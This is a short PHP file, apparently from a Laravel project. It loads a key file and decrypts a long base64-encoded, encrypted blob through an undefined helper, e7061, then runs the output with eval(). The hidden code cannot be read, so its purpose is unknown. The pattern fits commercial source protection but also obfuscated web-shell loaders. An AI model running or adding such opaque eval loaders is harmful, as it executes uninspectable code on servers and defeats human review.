<?php
$keyfile = public_path("key.inc.php");;
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
$e7091="R1AvY09jY1dQY2cwT3Iwb2RxYk1CNTZCZE9PNndtMW0wOUpiQUVRaUNQV05WM2hXcWljclIyN1J1Mzlmc0tJZUNnMzZaSWQyR3FZSHVMOXZ3M2xXeVJDcHdpRzJ4TjdsNGZZSVdmS09lWk1tTVlMbFBSclBBa3NrOFJONVRZYndVaWFRcjI2RDNoM2tPRkQ3VVQ0dGlkZG1XZ0N5THhvcnZxbnp2elJzbE1UT0NJQllZYXR4SmNHcnNGZW5YZHhKbm9UaHVmYjlJUW5aQkNmcnFNa3MwVEIzUGx3dnhMdHh5UVFYaTRVdmdsZytEUXRhd1U3ZVVPcVBoUm13bEtXbVYrSWpDRDZObmJyQSs4OFFQM1o5emZoa25QVlJxdkZyWGdOTi9mV0VTTlRuUytmbWNPenhVWFNRc2lLQnpSeWdkSVoxZzRtV1R0WWw0RE0yN0lNVEZXd2ZQYkNQWnU1UE1WY1dEVGlSMiswOCtuUzhpbGYrTWVCb0FYalRKZjVJczZlMS9wQ3cwMVoraExZcjNsbGJWKzhzWVdEanU5Z1pZM3ZNWTZYYlRqZnB5bGk5ZGhiNTY1cW13ZUpCTTRxTFhBNENxdlR6eDZpbXlwaWZrQmxveFg4RzZjMWtPeXJ1ZjhKdE8vb2x1NkJiM0JuODZoQnFFdXJ4dFQxS0RNOCsxSmtScjJKQ0hneGRyS2d0OENZMmFzUHRYYTA5V2o0WVBBbXF6bEZ3T0s3Qks5ejIxNTBmdnlpTnB3Njcwa3N1aUdyOHA1Ty9rMVZ5QzgyczErRlQ0YXBNM2Z6ZzU4L3RnakdLK2lxUnUxYzJITWhuSTVyWGZuYmNzZnVvOHNVZVd2OHNja1R4RTkzL1JDK2wrN0pNOStVMmEvQ282YlJCZ1hzaVNBcStva2JPakEySmw5VWt1Mm11eFYzNCtkZGFvQWp4S3F0cGVUYVpnUitITU9NVThRPT0=";eval(e7061($e7091));

